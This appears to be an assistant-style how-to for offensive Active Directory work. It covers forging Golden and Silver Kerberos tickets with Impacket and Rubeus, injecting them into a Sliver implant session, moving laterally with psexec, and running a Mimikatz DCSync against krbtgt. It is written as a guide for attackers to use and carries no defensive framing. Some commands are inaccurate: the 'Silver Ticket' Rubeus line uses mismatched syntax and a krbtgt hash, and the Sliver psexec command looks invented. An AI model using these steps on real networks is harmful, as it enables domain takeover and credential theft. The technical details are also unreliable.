To leverage **Golden**, **Silver**, or any other **Kerberos tickets** in **Sliver**, you need to load and use the ticket in your active session. Here's a step-by-step guide on how you can do this:

### 1. Generate a Golden or Silver Ticket

You can use **Impacket** or **Rubeus** to generate the tickets:

- **Golden Ticket** (Impacket):
    ```bash
    python3 ticketer.py -nthash <krbtgt_NTLM_hash> -domain-sid <SID> -domain <domain> <username>
    ```

- **Silver Ticket** (Rubeus):
    ```powershell
    Rubeus.exe tgt::golden /domain:<domain> /sid:<sid> /user:<username> /rc4:<krbtgt_hash> /id:<RID> /target:<trusteddomain.com>
    ```

The generated ticket will be in a `.kirbi` or binary format depending on the tool.

### 2. Transfer Ticket to the Machine Running Sliver

Once you have the **.kirbi** ticket, you need to transfer it to the machine where you're running **Sliver**.

### 3. Load the Ticket into Sliver Using Rubeus

If you have **Rubeus** on the target system (either natively or dropped through Sliver), you can inject the ticket.

For example, if you are using **Rubeus** on the system where your **Sliver** implant is running, inject the ticket like this:

```powershell
Rubeus.exe ptt /ticket:<path_to_ticket>.kirbi
```

This will inject the ticket into the current session, allowing you to authenticate using the ticket.

### 4. Leverage the Ticket in Sliver

Once the ticket is injected into the session:

- **Golden Ticket**: With a Golden Ticket, you have almost unrestricted access to the domain and can perform high-level administrative tasks.

- **Silver Ticket**: With a Silver Ticket, you have access to specific services within the domain.

Use Sliver’s **lateral movement** commands to move across the network, such as:

```bash
use psexec <domain>\<username>@<target>
```

Since you have the ticket injected, **Sliver** will use the Kerberos authentication for access to resources, similar to **psexec** with **Impacket**.

### 5. Verify Ticket Injection

To confirm that the ticket has been injected properly, you can use **klist**:

```powershell
klist
```

This will show you the active Kerberos tickets, including the one you injected.

### 6. Leverage Other Tools via Sliver

If you have other post-exploitation tools like **Impacket** or **Mimikatz** dropped on the target, you can use them through **Sliver** shells to interact with services or perform DCSync-like attacks across the network.

For instance:
```bash
mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:<domain>
```

This would leverage your **Golden Ticket** permissions for pulling the credentials of the trusted domain’s **krbtgt**.

### Summary
1. **Generate** your **Golden/Silver ticket**.
2. **Transfer** and **inject** the ticket using **Rubeus** or another tool.
3. Use **Sliver’s** post-exploitation capabilities to move laterally and execute commands under the impersonated Kerberos identity.

By using **Kerberos ticket injection** in **Sliver**, you can leverage **Golden** and **Silver Tickets** to escalate privileges and move laterally across the domain.
